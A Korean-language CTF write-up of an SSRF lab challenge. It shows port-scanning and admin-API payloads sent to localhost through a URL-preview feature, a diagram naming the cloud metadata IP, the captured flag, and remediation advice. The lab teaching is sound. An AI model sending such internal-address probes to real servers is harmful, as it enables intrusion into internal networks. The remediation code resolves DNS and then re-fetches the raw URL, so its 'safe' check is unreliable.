+++
title = "VulnABLE CTF [LUXORA] Write-up: SSRF 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "SSRF", "Bronze", "Internal Network", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: SSRF 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Server-Side Layer (SSRF)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/ssrf/bronze`
- **목표**: 서버가 사용자가 제공한 URL을 대신 방문해주는 기능(Webhook, 이미지 다운로더 등)에서 목적지 URL에 대한 검증을 누락한 취약점을 악용하여, 외부에서는 접근할 수 없는 **서버 내부(Localhost)의 숨겨진 관리자 API**를 호출하고 데이터를 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/ssrf/bronze` 페이지는 외부 웹사이트의 URL을 입력하면, 서버가 해당 웹사이트에 접속하여 썸네일 이미지나 HTML 미리보기를 가져오는 기능(URL Preview)을 제공합니다.

**[정상 요청 테스트]**
```http
POST /ssrf/bronze HTTP/1.1
Content-Type: application/x-www-form-urlencoded

url=http://example.com
```

**[서버의 응답]**
```html
<div class="preview">
  <h1>Example Domain</h1>
  <p>This domain is for use in illustrative examples...</p>
</div>
```

**[해커의 사고 과정]**
1. 이 애플리케이션은 내가 지정한 URL로 **서버가 직접 HTTP 요청**을 날리고 있다.
2. 만약 내가 `url` 파라미터에 구글이나 네이버가 아니라, 서버 자기 자신의 주소인 `http://localhost:8080` 이나 내부망 주소 `http://192.168.1.5` 를 넣는다면?
3. 보통 이런 내부 주소들은 방화벽에 의해 외부 인터넷에서는 접근이 막혀 있지만, 서버 자기 자신이 자신에게 요청하는 것(Localhost 통신)은 방화벽을 통과할 수 있다!

---

## 💥 2. 취약점 식별 및 내부 API 탐색 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(url=http://169.254.169.254)--> [ Web Server ]
                                               |-- Fetches Metadata
<-- Metadata Returned -------------------------|
```


이 취약점이 바로 **SSRF (Server-Side Request Forgery)** 입니다. 서버를 프록시(Proxy)처럼 이용하여 내부망을 정찰하거나 공격하는 기법입니다.

### 💡 내부망 포트 스캐닝
해커는 타겟 서버의 내부에 어떤 포트가 열려있는지 확인하기 위해 포트 번호를 바꿔가며 요청을 보냅니다. (이 과정을 Burp Suite Intruder로 자동화할 수 있습니다.)

- `url=http://localhost:22` (SSH) ➔ 응답: `SSH-2.0-OpenSSH...`
- `url=http://localhost:3306` (MySQL) ➔ 응답: 알 수 없는 바이너리 에러
- `url=http://localhost:8080` (내부 웹 API) ➔ 응답: `{"error": "Unauthorized"}` (뭔가 찾았습니다!)

### 💡 내부 API 접근
포트 8080에 내부용 API가 있다는 것을 확인했습니다. 여러 경로(`/admin`, `/status`, `/api/internal`)를 추측하여 찔러봅니다.

**[공격 페이로드 (Burp Suite)]**
```http
POST /ssrf/bronze HTTP/1.1
Content-Type: application/x-www-form-urlencoded

url=http://localhost:8080/admin
```

---

## 🚀 3. 공격 수행 및 결과 확인

서버는 해커의 요청을 받고, 아무 의심 없이 자기 자신의 8080 포트로 `GET /admin` 요청을 보냅니다.

### 🔍 조작된 서버의 응답
8080 포트의 내부 API 서버는 요청이 `localhost`에서 왔으므로 "아, 우리 서버 내부에서 온 관리자 통신이구나"라고 판단하여 인증을 패스시키고 민감한 관리자 대시보드 데이터를 반환합니다.

그리고 메인 서버는 그 결과를 해커에게 다시 돌려줍니다(In-band SSRF).

```html
<div class="preview">
  <h2>Internal Admin Console (Localhost Only)</h2>
  <ul>
    <li>System Load: 15%</li>
    <li>Database Status: Connected</li>
  </ul>
  <p class="flag">FLAG{SSRF_🥉_BASIC_LOCALHOST_C4D5E6}</p>
</div>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

URL을 입력받아 데이터를 가져오는(Fetch) 흔한 비즈니스 로직이, 목적지 IP와 도메인을 검증하지 않았을 때 내부망을 유린하는 치명적인 SSRF 통로로 사용될 수 있음을 증명했습니다.

**🔥 획득한 플래그:**
`FLAG{SSRF_🥉_BASIC_LOCALHOST_C4D5E6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
서버가 HTTP 클라이언트(cURL, Axios, HttpClient 등)를 사용하여 외부로 요청을 보낼 때, 타겟 URL의 IP 주소가 내부망 대역(Private IP Range)인지 확인하지 않은 것이 원인입니다.

* **안전한 패치 가이드 (URL 및 IP 화이트리스팅)**
1. **도메인 분해 및 IP 검증 (DNS Resolution Check)**:
   사용자가 입력한 URL을 파싱하여 호스트명을 추출하고, DNS를 통해 실제 접속할 IP 주소로 변환합니다. 그 IP가 사설망(`127.0.0.0/8`, `10.0.0.0/8`, `192.168.0.0/16`, `172.16.0.0/12`)이나 메타데이터 IP(`169.254.169.254`)인지 검사하여 차단합니다.

```javascript
// Node.js (axios) 안전한 요청 예시
const dns = require('dns');
const url = new URL(userInput);

dns.lookup(url.hostname, (err, address) => {
    // 1. IP가 사설 대역(내부망)인지 정규식 등으로 엄격하게 검사
    if (isPrivateIP(address)) {
        return res.status(403).send("SSRF Blocked: Access to internal networks is not allowed.");
    }
    
    // 2. 검증이 끝난 경우에만 외부 요청 수행
    axios.get(userInput).then(...);
});
```

*(참고: 클라우드 환경의 경우, 클라우드 제공자(AWS, AWS)의 메타데이터 서버에 접근하는 것을 막기 위해 `169.254.169.254` IP를 반드시 차단해야 합니다. 더 나아가 인프라 레벨(iptables, Security Group)에서 애플리케이션 서버가 내부망으로 향하는 아웃바운드 트래픽을 원천 차단하는 것이 가장 안전합니다.)*